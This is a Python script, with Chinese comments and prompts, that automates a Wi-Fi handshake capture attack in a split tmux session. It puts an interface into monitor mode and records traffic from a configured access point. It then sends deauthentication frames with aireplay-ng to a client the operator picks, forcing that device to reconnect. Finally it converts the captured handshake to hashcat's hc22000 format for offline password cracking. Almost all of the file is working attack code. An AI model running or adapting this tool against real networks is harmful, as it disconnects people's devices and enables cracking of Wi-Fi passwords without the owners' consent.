#!/usr/bin/env python3
import subprocess
import sys
import time
import csv
from pathlib import Path
import os
import json

# ========= 固定配置 =========
# 读取配置文件
CONFIG_PATH = Path(__file__).parent / "config.json"
with open(CONFIG_PATH, "r") as config_file:
    config = json.load(config_file)

IFACE = config["IFACE"]
MON = config["MON"]
BSSID = config["BSSID"]
CHANNEL = config["CHANNEL"]
SESSION = config["SESSION"]
# ============================





def read_stations(csv_file):
    stations = []
    if not csv_file.exists():
        return stations

    with open(csv_file, newline="", errors="ignore") as f:
        reader = csv.reader(f)
        in_station = False
        for row in reader:
            if not row:
                in_station = True
                continue
            if in_station and len(row) > 5:
                mac = row[0].strip()
                pwr = row[3].strip()
                if mac.count(":") == 5 and pwr.lstrip("-").isdigit():
                    stations.append((mac, int(pwr)))

    stations.sort(key=lambda x: x[1], reverse=True)
    return stations


def next_run_dir(base, name):
    base.mkdir(exist_ok=True)
    i = 1
    while True:
        d = base / f"{name}_{i:03d}"
        if not d.exists():
            return d
        i += 1


# ========== 左窗格：纯显示 ==========
def run_capture(workdir, name):
    os.chdir(workdir)
    subprocess.run(["airmon-ng", "start", IFACE], check=False)
    subprocess.run([
        "airodump-ng",
        "-c", CHANNEL,
        "--bssid", BSSID,
        "-w", name,
        MON
    ])


# ========== 右窗格：Python 交互 ==========
def run_control(workdir, name):
    os.chdir(workdir)
    csv_file = workdir / f"{name}-01.csv"
    cap_file = workdir / f"{name}-01.cap"

    while True:
        print("[d] 选择 Station → 单次 deauth")
        print("[q] 结束并转换 hc22000\n")        
        cmd = input("> ").strip().lower()

        if cmd == "d":
            stations = read_stations(csv_file)
            if not stations:
                print("[!] 未检测到 Station")
                continue

            for i, (mac, pwr) in enumerate(stations, 1):
                print(f"[{i}] {mac}  PWR:{pwr}")

            sel = input("选择编号: ").strip()
            if not sel.isdigit():
                print("[!] 取消")
                continue

            idx = int(sel) - 1
            if idx < 0 or idx >= len(stations):
                print("[!] 编号无效")
                continue

            mac = stations[idx][0]
            subprocess.run([
                "aireplay-ng",
                "-0", "2",
                "-a", BSSID,
                "-c", mac,
                MON
            ])

        elif cmd == "q":
            if cap_file.exists():
                subprocess.run([
                    "hcxpcapngtool",
                    "-o", f"{name}.hc22000",
                    str(cap_file)
                ])
            print("[*] 结束,5s后关闭")
            time.sleep(5)
            break


# ========== tmux 管理 ==========
def main():
    SCRIPT = Path(__file__).resolve()
    BASE = SCRIPT.parent / "runs"

    name = input("实验名称（文件名）: ").strip()
    if not name:
        return

    workdir = next_run_dir(BASE, name)
    workdir.mkdir(parents=True)

    # 清理旧 session
    subprocess.run(
        ["tmux", "kill-session", "-t", SESSION],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # 创建 session（左窗格）
    subprocess.run([
        "tmux", "new-session", "-d",
        "-s", SESSION,
        f"exec python3 {SCRIPT} --capture {workdir} {name}"
    ])

    # 在 session 内 split 右窗格（★关键修复点）
    subprocess.run([
        "tmux", "split-window", "-h",
        "-t", f"{SESSION}:0",
        f"exec python3 {SCRIPT} --control {workdir} {name}"
    ])

    # 可选：锁定布局
    subprocess.run(["tmux", "select-layout", "-t", SESSION, "even-horizontal"])

    subprocess.run(["tmux", "attach", "-t", SESSION])


if __name__ == "__main__":
    if "--capture" in sys.argv:
        _, _, wd, nm = sys.argv
        run_capture(Path(wd), nm)
    elif "--control" in sys.argv:
        _, _, wd, nm = sys.argv
        run_control(Path(wd), nm)
    else:
        main()
